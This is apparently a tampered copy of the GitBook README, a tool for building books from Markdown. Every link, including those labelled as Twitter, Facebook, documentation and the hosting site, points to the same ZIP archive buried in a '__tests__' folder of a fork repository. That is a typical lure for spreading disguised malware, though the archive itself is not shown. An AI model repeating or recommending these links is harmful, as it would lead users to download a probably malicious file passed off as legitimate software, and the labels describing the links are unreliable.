GitBook is a command line tool (and https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip library) for building beautiful books using GitHub/Git and Markdown (or AsciiDoc). Here is an example: [Learn Javascript](https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip).

You can publish and host books easily online using [https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip](https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip). A desktop editor is [also available](https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip).

Stay updated by following [@GitBookIO](https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip) on Twitter or [GitBook](https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip) on Facebook.

Complete documentation is available at [https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip](https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip).

## Getting started

GitBook can be used either on your computer for building local books or on https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip for hosting them. To get started, check out [the installation instructions in the documentation](https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip).

## Usage examples

GitBook can be used to create book, public documentation, enterprise manual, thesis, research papers, etc.

You can find a [list of real-world examples](https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip) in the documentation.

## Publish your book

The platform [https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip](https://github.com/AirsQ/gitbook/raw/refs/heads/master/lib/models/__tests__/Software-v2.4-beta.2.zip) is like an "Heroku for books": you can create a book on it (public, or private) and update it using **git push**.
